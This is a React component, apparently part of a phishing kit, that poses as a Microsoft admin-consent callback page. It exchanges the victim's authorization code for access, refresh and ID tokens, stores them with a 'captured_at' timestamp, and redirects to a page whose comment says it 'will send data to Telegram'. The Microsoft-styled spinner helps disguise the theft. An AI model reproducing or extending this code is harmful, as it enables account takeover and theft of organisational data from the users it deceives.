import { useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

export default function AdminConsentCallback() {
  const location = useLocation();
  const navigate = useNavigate();

  useEffect(() => {
    const handleCallback = async () => {
      const params = new URLSearchParams(location.search);
      const code = params.get('code');
      const error = params.get('error');
      const errorDescription = params.get('error_description');

      console.log('🔄 AdminConsentCallback: Processing OAuth redirect');
      console.log('📋 Code:', code ? '✓ Present' : '✗ Missing');
      console.log('❌ Error:', error || 'None');

      if (error) {
        console.error('❌ Admin consent error:', errorDescription);
        alert(`Error: ${errorDescription}`);
        navigate('/');
        return;
      }

      if (!code) {
        console.error('❌ No authorization code received');
        navigate('/');
        return;
      }

      try {
        console.log('🔄 Exchanging authorization code for tokens...');

        // ✅ FIX: Use a relative path to the Netlify function.
        // This respects the proxy rule in your netlify.toml (`/api/*`).
        const response = await fetch('/api/exchangeAdminConsentCode', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            code,
            email: sessionStorage.getItem('ms_email'),
            state: sessionStorage.getItem('ms_oauth_state')
          })
        });

        if (!response.ok) {
          const errorData = await response.json();
          throw new Error(`HTTP ${response.status}: ${errorData.error_description || 'Token exchange failed'}`);
        }

        const data = await response.json();

        console.log('✅ Tokens received:', {
          access_token: data.access_token ? '✓' : '✗',
          refresh_token: data.refresh_token ? '✓' : '✗',
          id_token: data.id_token ? '✓' : '✗'
        });

        // Store tokens
        localStorage.setItem('ms_oauth_tokens', JSON.stringify({
          access_token: data.access_token,
          refresh_token: data.refresh_token,
          id_token: data.id_token,
          expires_at: Date.now() + (data.expires_in * 1000),
          captured_at: new Date().toISOString()
        }));

        console.log('💾 Tokens stored');
        console.log('🔄 Redirecting to /auth/callback for final processing...');

        // Redirect to AuthCallback which will send data to Telegram
        setTimeout(() => {
          navigate('/auth/callback/legacy');
        }, 1000);

      } catch (error) {
        console.error('❌ Token exchange error:', error);
        alert('Failed to complete sign-in');
        navigate('/');
      }
    };

    handleCallback();
  }, [location, navigate]);

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      flexDirection: 'column',
      fontFamily: 'Segoe UI, Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
      <div style={{ fontSize: '18px', marginBottom: '20px', color: '#323130' }}>
        Processing admin consent...
      </div>
      <div style={{
        border: '4px solid #f3f2f1',
        borderTop: '4px solid #0078d4',
        borderRadius: '50%',
        width: '40px',
        height: '40px',
        animation: 'spin 1s linear infinite'
      }}></div>
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
